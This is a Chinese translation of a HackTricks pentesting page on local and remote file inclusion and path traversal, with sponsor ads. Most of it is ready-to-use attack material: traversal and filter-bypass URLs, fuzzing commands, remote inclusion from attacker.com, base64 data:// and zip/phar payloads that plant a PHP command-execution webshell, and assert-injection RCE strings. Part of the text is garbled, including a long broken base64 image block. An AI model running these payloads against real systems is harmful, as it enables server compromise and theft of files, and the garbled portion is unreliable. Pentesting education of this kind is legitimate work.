# 文件包含/路径遍历

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要获取**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**无需延迟获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在web3渗透测试中获得经验**\
区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声望积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

## 文件包含

**远程文件包含（RFI）：** 文件从远程服务器加载（最好：您可以编写代码，服务器将执行它）。在php中，默认情况下**禁用**此功能（**allow\_url\_include**）。\
**本地文件包含（LFI）：** 服务器加载本地文件。

当用户以某种方式控制将要由服务器加载的文件时，就会出现漏洞。

易受攻击的**PHP函数**：require、require\_once、include、include\_once

一个有趣的利用此漏洞的工具：[https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## 盲目 - 有趣 - LFI2RCE文件
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**混合了几个 \*nix LFI 列表并添加了更多路径，我创建了这个列表：**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

还可以尝试将 `/` 更改为 `\`\
还可以尝试添加 `../../../../../`

可以在[这里](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)找到一个使用多种技术来查找文件 /etc/password（以检查漏洞是否存在）的列表。

### **Windows**

合并了几个列表，我创建了这个列表：

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

还可以尝试将 `/` 更改为 `\`\
还可以尝试删除 `C:/` 并添加 `../../../../../`

可以在[这里](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)找到一个使用多种技术来查找文件 /boot.ini（以检查漏洞是否存在）的列表。

### **OS X**

查看 Linux 的 LFI 列表。

## 基本 LFI 和绕过方法

所有示例都是针对本地文件包含，但也可以应用于远程文件包含（page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/）。
```
http://example.com/index.php?page=../../../etc/passwd
```
### 递归剥离的遍历序列

When performing file inclusion attacks, it is common to encounter input validation mechanisms that strip traversal sequences (such as "../" or "..\") from user-supplied input. However, these mechanisms are often implemented in a non-recursive manner, meaning that they only remove one occurrence of the traversal sequence at a time.

在执行文件包含攻击时，常常会遇到输入验证机制，该机制会从用户提供的输入中剥离遍历序列（例如"../"或"..\"）。然而，这些机制通常是以非递归的方式实现的，这意味着它们一次只能移除一个遍历序列的出现。

This behavior can be exploited by using multiple traversal sequences in a single payload. By including multiple traversal sequences, we can bypass the input validation mechanism and successfully include files that would otherwise be restricted.

我们可以利用这种行为，使用多个遍历序列在一个有效载荷中。通过包含多个遍历序列，我们可以绕过输入验证机制，并成功包含那些本来受限制的文件。

For example, if the input validation mechanism removes only one occurrence of "../" at a time, we can use a payload like "../../../../etc/passwd" to include the "/etc/passwd" file.

例如，如果输入验证机制一次只移除一个"../"的出现，我们可以使用类似"../../../../etc/passwd"的有效载荷来包含"/etc/passwd"文件。

It is important to note that this technique relies on the specific behavior of the input validation mechanism. If the mechanism is updated to remove multiple occurrences of traversal sequences, this technique may no longer be effective.

需要注意的是，这种技术依赖于输入验证机制的特定行为。如果该机制被更新为移除多个遍历序列的出现，这种技术可能不再有效。
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **空字节（%00）**

绕过在提供的字符串末尾添加更多字符的限制（绕过方法：$\_GET\['param']."php"）
```
http://example.com/index.php?page=../../../etc/passwd%00
```
这个问题在PHP 5.4之后已经解决。

### 编码

你可以使用非标准的编码，比如双重URL编码（以及其他编码方式）：
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 从现有文件夹

也许后端正在检查文件夹路径：
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 识别服务器上的文件夹

根据应用程序代码/允许的字符，可能可以通过发现文件夹而不仅仅是文件来递归地探索文件系统。为了做到这一点：

* 通过成功检索`/etc/passwd`（如果在Linux上）来确定您当前目录的"深度"：
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* 通过添加文件夹名称（这里是 `private`）并返回到 `/etc/passwd`，尝试猜测当前目录中的文件夹名称：
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* 如果应用程序存在漏洞，请求可能会有两种不同的结果：
* 如果你得到一个错误/没有输出，那么这个位置不存在`private`文件夹
* 如果你得到了`/etc/passwd`的内容，那么你验证了当前目录确实存在一个`private`文件夹
* 使用这种技术发现的文件夹可以使用经典的LFI方法进行文件模糊测试，或者使用相同的递归技术进行子目录模糊测试。

可以将这种技术调整为在文件系统的任何位置查找目录。例如，如果在相同的假设下（当前目录在文件系统的深度3处），你想要检查`/var/www/`是否包含一个`private`目录，请使用以下有效载荷：
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
以下命令序列允许使用 `sed` (1) 生成用作 url 模糊测试工具（如 `ffuf` (2)）的输入的有效载荷：
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
当然，根据您的需求调整有效载荷的深度/位置/输入目录列表。

### **路径截断**

绕过在提供的字符串末尾添加更多字符的操作（绕过方式：$\_GET\['param']."php"）
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
始终尝试以一个虚假目录（a/）**开头**路径。

**此漏洞已在PHP 5.3中修复。**

### **绕过过滤器的技巧**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## 远程文件包含

在 PHP 中，默认情况下禁用此功能，因为 **`allow_url_include`** 的值为 **Off**。它必须设置为 **On** 才能正常工作，在这种情况下，您可以从您的服务器包含一个 PHP 文件并获得远程代码执行（RCE）的能力：
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
如果由于某种原因 **`allow_url_include`** 是 **开启**的，但是PHP正在**过滤**对外部网页的访问，[根据这篇文章](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)，你可以使用例如使用base64的data协议来解码一个b64 PHP代码并获得RCE：

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
在上面的代码中，最后添加了 `+.txt` 是因为攻击者需要一个以 `.txt` 结尾的字符串，这样在经过 b64 解码后，这部分将返回无用的内容，而真正的 PHP 代码将被包含（从而执行）。
{% endhint %}

另一个**不使用 `php://` 协议**的示例是：

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python 根元素

在Python中，像下面这样的代码：
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
如果用户传递了一个**绝对路径**给**`file_name`**，那么**之前的路径会被移除**：
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
这是根据[文档](https://docs.python.org/3.10/library/os.path.html#os.path.join)的预期行为：

> 如果一个组件是绝对路径，则所有先前的组件都被丢弃，连接将从绝对路径组件继续。

## Java列出目录

看起来，如果在Java中存在路径遍历，并且您**请求的是一个目录**而不是一个文件，则会返回**目录的列表**。这在其他语言中不会发生（据我所知）。

## 前25个参数

以下是可能容易受到本地文件包含（LFI）漏洞攻击的前25个参数的列表（来自[链接](https://twitter.com/trbughunters/status/1279768631845494787)）：
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## 使用PHP包装器和协议的LFI / RFI

### php://filter

PHP过滤器允许在读取或写入数据之前对数据进行基本的修改操作。有5个过滤器类别：

* [字符串过滤器](https://www.php.net/manual/en/filters.string.php)：
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`：从数据中删除标签（位于"<"和">"字符之间的所有内容）
* 请注意，此过滤器已从现代版本的PHP中消失
* [转换过滤器](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*`：转换为不同的编码（`convert.iconv.<input_enc>.<output_enc>`）。要获取支持的**所有编码列表**，请在控制台中运行：`iconv -l`

{% hint style="warning" %}
滥用`convert.iconv.*`转换过滤器，您可以**生成任意文本**，这对于编写任意文本或使包含过程成为任意文本的函数可能很有用。有关更多信息，请查看[LFI2RCE通过php过滤器](lfi2rce-via-php-filters.md)。
{% endhint %}

* [压缩过滤器](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`：压缩内容（如果外泄大量信息时有用）
* `zlib.inflate`：解压数据
* [加密过滤器](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*`：已弃用
* `mdecrypt.*`：已弃用
* 其他过滤器
* 在php中运行`var_dump(stream_get_filters());`，您可以找到一些**意外的过滤器**：
* `consumed`
* `dechunk`：反转HTTP分块编码
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter"部分是不区分大小写的。
{% endhint %}

### php://fd

此包装器允许访问进程打开的文件描述符。可能有用于窃取已打开文件的内容：
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
您还可以使用**php://stdin、php://stdout和php://stderr**来分别访问**文件描述符0、1和2**（不确定这在攻击中有何用处）

### zip://和rar://

上传一个包含PHPShell的Zip或Rar文件并访问它。\
为了能够滥用rar协议，**需要专门激活**它。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

data://是一种URL协议，用于在Web应用程序中包含数据。它允许将数据直接嵌入到URL中，而不是从外部文件加载。这种技术可以用于在网页中嵌入图像、音频、视频或其他类型的数据。

使用data://协议时，数据被编码为Base64格式，并直接放置在URL中。这意味着数据将作为URL的一部分传输，而不是从服务器上的文件加载。这种方法可以减少对外部资源的依赖，提高网页加载速度。

要使用data://协议，只需在URL中指定数据的MIME类型，然后将数据编码为Base64格式。例如，要在网页中嵌入一张图片，可以使用以下格式的URL：

```
data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAWElEQVQ4T2NkoBAwUqifg/8GBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGB
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
有趣的事实：你可以使用以下代码触发XSS并绕过Chrome Auditor：`http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

请注意，这个协议受到php配置中的**`allow_url_open`**和**`allow_url_include`**的限制。

### expect://

需要激活Expect才能执行代码。
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### 输入://

在POST参数中指定您的有效载荷
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

如果网站使用类似`include`的函数来加载文件，`.phar`文件也可以用来执行PHP代码。

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

你可以通过执行以下命令来编译`phar`文件：
```bash
php --define phar.readonly=0 create_path.php
```
将生成一个名为`test.phar`的文件，您可以使用它来滥用LFI。

如果LFI只是读取文件而不执行其中的php代码，例如使用函数如`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`或`filesize()`。您可以尝试滥用在使用phar协议读取文件时发生的反序列化。

有关更多信息，请阅读以下文章：

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### 更多协议

检查更多可能的[**协议以在此处包含**](https://www.php.net/manual/en/wrappers.php)**：**

* [php://memory和php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 写入内存或临时文件（不确定在文件包含攻击中如何有用）
* [file://](https://www.php.net/manual/en/wrappers.file.php) — 访问本地文件系统
* [http://](https://www.php.net/manual/en/wrappers.http.php) — 访问HTTP(s) URL
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — 访问FTP(s) URL
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 压缩流
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 查找与模式匹配的路径名（它不返回任何可打印的内容，因此在这里并不真正有用）
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — 安全外壳2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 音频流（不适用于读取任意文件）

## 通过PHP的'assert'进行LFI

如果遇到一个困难的LFI，似乎过滤遍历字符串（如“..”）并响应类似“Hacking attempt”或“Nice try!”的内容，那么'assert'注入有效载荷可能会起作用。

像这样的有效载荷：
```
' and die(show_source('/etc/passwd')) or '
```
将成功利用以下形式的"file"参数的PHP代码：
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
也有可能在一个易受攻击的"assert"语句中使用system()函数来实现远程代码执行（RCE）：
```
' and die(system("whoami")) or '
```
确保在发送之前对有效载荷进行URL编码。

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在web3渗透测试中获得经验**\
区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行动中获利！

{% embed url="https://hackenproof.com/register" %}

## PHP盲目路径遍历

{% hint style="warning" %}
在以下情况下，此技术适用：您**控制**将**访问文件**的**PHP函数**的**文件路径**，但您无法看到文件的内容（例如简单调用**`file()`**），但不显示内容。
{% endhint %}

在[**这篇令人难以置信的文章**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)中，解释了如何通过PHP过滤器滥用盲目路径遍历以通过错误oracle泄露文件的内容。

简而言之，该技术使用**“UCS-4LE”编码**使文件的内容变得如此**庞大**，以至于打开文件的**PHP函数将触发错误**。

